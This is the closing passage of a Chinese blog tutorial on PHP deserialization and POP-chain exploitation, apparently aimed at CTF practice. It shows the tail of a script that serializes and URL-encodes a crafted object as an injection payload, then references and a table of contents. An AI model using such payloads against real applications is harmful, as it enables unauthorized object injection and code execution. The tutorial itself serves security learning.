class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = new start_gg;//构造start_gg类对象$b</span><br><span class="line">echo urlencode(serialize($b)).&quot;&lt;br /&gt;&quot;;//显示输出url编码后的序列化对象</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>Blog：<a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">0x01</a>    <a href="https://cloud.tencent.com/developer/article/1151603" target="_blank" rel="noopener">0x02</a>    <a href="https://forum.90sec.com/t/topic/573" target="_blank" rel="noopener">0x03</a></p>
<p>扩展题目：<a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">0x01</a>     <a href="https://cl0und.github.io/2017/10/01/POP链学习/" target="_blank" rel="noopener">0x02</a> </p>
<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>菜鸡还不具备创造能力，部分学习内容来自网络，回馈网络，如涉及版权问题，请联系删除  orz </p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://passenger-amao.github.io">AMao</a></p><p> <span>Link:  </span><a href="https://passenger-amao.github.io/2020/05/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://passenger-amao.github.io/2020/05/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p> <span>Copyright:  </span><span>本站所有文章均采用 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">署名-非商业性使用-相同方式共享 4.0 国际(CC BY-NC-SA 4.0)</a> 许可协议。转载请注明出处！</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2020/04/30/Docker/" title="浅谈 Docker"><span>NextPost ></span><br><span class="nextTitle">浅谈 Docker</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo" target="_blank" rel="noopener"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基本概念"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POP-面向属性编程（Property-Oriented-Programing）"><span class="toc-number">1.1.</span> <span class="toc-text">POP  面向属性编程（Property-Oriented Programing）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#序列化"><span class="toc-number">1.2.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化"><span class="toc-number">1.3.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#魔术方法"><span class="toc-number">1.4.</span> <span class="toc-text">魔术方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反序列化对象注入"><span class="toc-number">2.</span> <span class="toc-text">反序列化对象注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过-wakeup-方法"><span class="toc-number">2.1.</span> <span class="toc-text">绕过 __wakeup() 方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#session-反序列化漏洞"><span class="toc-number">3.</span> <span class="toc-text">session 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-session"><span class="toc-number">3.1.</span> <span class="toc-text">PHP session</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Session-工作流程"><span class="toc-number">3.2.</span> <span class="toc-text">PHP Session 工作流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">3.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#由乌云白帽子-ryat-师傅于-2015-12-12-在-php官网上提出来，乌云编号：71101"><span class="toc-number">3.3.1.</span> <span class="toc-text">由乌云白帽子 ryat 师傅于 2015-12-12 在 php官网上提出来，乌云编号：71101</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2019极客巅峰-lol-link"><span class="toc-number">3.4.</span> <span class="toc-text">2019极客巅峰    lol   link</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jarvisoj-PHPINFO"><span class="toc-number">3.5.</span> <span class="toc-text">Jarvisoj  PHPINFO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安洵杯-Double-s"><span class="toc-number">3.5.1.</span> <span class="toc-text">安洵杯 Double-s</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP链构造"><span class="toc-number">3.6.</span> <span class="toc-text">POP链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本概念-1"><span class="toc-number">3.6.1.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POP链利用思路"><span class="toc-number">3.6.2.</span> <span class="toc-text">POP链利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例"><span class="toc-number">3.6.3.</span> <span class="toc-text">实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#声明"><span class="toc-number">5.</span> <span class="toc-text">声明</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>